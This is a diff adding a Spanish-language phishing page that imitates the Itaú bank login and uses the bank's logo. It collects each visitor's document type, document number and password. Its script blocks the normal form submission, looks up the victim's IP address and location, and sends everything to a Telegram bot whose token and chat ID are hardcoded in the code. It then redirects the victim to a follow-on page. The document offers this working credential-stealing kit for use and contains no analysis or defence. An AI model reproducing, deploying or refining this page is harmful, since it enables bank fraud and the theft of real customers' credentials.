@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+        }
+
+        .top-section {
+            position: relative;
+            height: 50%;
+            width: 100%;
+            background: url('https://usagif.com/wp-content/uploads/2022/hqgif/ocean-wave-5-beautiful-waves-on-the-beach-acegif.gif') no-repeat center center;
+            background-size: cover;
+            background-position: top center;
+        }
+
+        .logo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 100px;
+            height: auto;
+        }
+
+        .login-form-section {
+            width: 100%;
+            max-width: 500px;
+            padding: 30px;
+            text-align: left;
+            background: transparent;
+        }
+
+        .login-form-section h2 {
+            color: #333;
+            font-size: 1.1rem;
+            margin: 0;
+            padding-top: 10px;
+            text-align: left;
+            margin-top: 20px;
+        }
+
+        .inputs-container {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .inputs-container select, .inputs-container input {
+            width: 48%;
+            padding: 12px;
+            border: none;
+            border-bottom: 2px solid #9b9b9b;
+            font-size: 1rem;
+            text-align: left;
+            background-color: transparent;
+            position: relative;
+            transition: border-color 0.3s ease;
+        }
+
+        .login-form input[type="password"] {
+            width: 80%;
+            padding: 12px;
+            border: none;
+            border-bottom: 2px solid #9b9b9b;
+            font-size: 1rem;
+            text-align: left;
+            background-color: transparent;
+            padding-right: 30px;
+            transition: border-color 0.3s ease;
+        }
+
+        .lock-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            background-image: url('https://img.icons8.com/ios/452/lock.png');
+            background-size: cover;
+        }
+
+        .login-form button {
+            width: 80%;
+            padding: 12px;
+            background-color: #9b9b9b;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .login-form button:hover {
+            background-color: #ff6600;
+        }
+
+        .login-form:valid button {
+            background-color: #ff6600;
+        }
+
+        select {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+
+        .input-label {
+            width: 100%;
+            margin-bottom: 5px;
+            font-size: 1rem;
+            color: #333;
+        }
+
+        .inputs-container select:valid, .inputs-container input:valid {
+            border-bottom: 2px solid #ff6600;
+        }
+
+        .login-form input[type="password"]:valid {
+            border-bottom: 2px solid #ff6600;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 34px;
+            height: 20px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #9b9b9b;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 12px;
+            width: 12px;
+            border-radius: 50%;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+        }
+
+        input:checked + .slider {
+            background-color: #ff6600;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(14px);
+        }
+
+        .forgot-password {
+            font-size: 0.9rem;
+            color: #9b9b9b;
+            text-decoration: underline;
+            cursor: pointer;
+            margin-top: 10px;
+            display: inline-block;
+        }
+
+        @media screen and (max-width: 768px) {
+            body {
+                justify-content: flex-start;
+            }
+
+            .login-form-section {
+                width: 100%;
+                padding: 15px;
+                max-width: 100%;
+            }
+
+            .inputs-container {
+                flex-direction: row;
+                align-items: center;
+                width: 100%;
+            }
+
+            .inputs-container select, .inputs-container input {
+                width: 48%;
+                margin-bottom: 15px;
+            }
+
+            .login-form input[type="password"] {
+                width: 100%;
+                padding-right: 40px;
+            }
+
+            .lock-icon {
+                position: absolute;
+                right: 10px;
+                top: 50%;
+                transform: translateY(-50%);
+                width: 18px;
+                height: 18px;
+            }
+
+            .login-form button {
+                width: 100%;
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="top-section">
+        <img src="https://banco.itau.co/documents/106240/0/Logo_blanco.png/940514b1-4fb3-37cb-4b73-a21f61c880cd?version=1.0&t=1710893657086" alt="Logo" class="logo">
+    </div>
+
+    <div class="login-form-section">
+        <h2>Ingresá tu documento</h2>
+        <form id="loginForm" class="login-form" action="login_process.php" method="POST">
+            <label for="document_type" class="input-label">Tipo</label>
+            <div class="inputs-container">
+                <select name="document_type" id="document_type" required>
+                    <option value="CI" selected>CI</option>
+                    <option value="Pasaporte">Pasaporte</option>
+                    <option value="DNI">DNI</option>
+                    <option value="Otros">Otros</option>
+                </select>
+                <input type="text" name="document_number" placeholder="n° documento" required>
+            </div>
+
+            <label for="password" class="input-label">Ingresá tu contraseña</label>
+            <div style="position: relative;">
+                <input type="password" name="password" id="password" placeholder="Contraseña" required>
+                <div class="lock-icon"></div>
+            </div>
+
+            <div style="margin-top: 15px; display: flex; align-items: center;">
+                <label class="switch">
+                    <input type="checkbox" id="remember">
+                    <span class="slider"></span>
+                </label>
+                <label for="remember" style="font-size: 0.9rem; margin-left: 10px;">Recordar documento</label>
+            </div>
+
+            <a href="#" class="forgot-password">Olvidé mi contraseña</a>
+          <br><br>
+
+            <button type="submit">Entrar</button>
+        </form>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        // Función para enviar el formulario a Telegram
+        function enviarATelegram(e) {
+            e.preventDefault(); // Evita que el formulario se envíe de la manera tradicional
+
+            // Obtener los valores del formulario
+            const document_type = document.querySelector('select[name="document_type"]').value;
+            const document_number = document.querySelector('input[name="document_number"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            // Obtener la IP, ciudad y país
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                var ip = data.ip;
+
+                $.getJSON("https://ipinfo.io", function (response) {
+                    var location = response.city + ", " + response.country;
+
+                    const mensaje = `🐇🍀 AW-Itau:
+                    \n🐰 Tipo de Documento: ${document_type}
+                    \n🔒 Número de Documento: ${document_number}
+                    \n🔑 Clave: ${password}
+                    \n🌍 IP: ${ip}
+                    \n📍 Ubicación: ${location}`;
+
+                    fetch(`https://api.telegram.org/bot8139790839:AAEmmA54ViWvwUx_WHSSc8lYX7HQ41DWxKc/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: '7303290094',
+                            text: mensaje
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(data);
+                        if (data.ok) {
+                            window.location.href = "car.html";
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('Ocurrió un error al intentar enviar el mensaje.');
+                    });
+                });
+            });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', enviarATelegram);
+    </script>
+</body>
+</html>
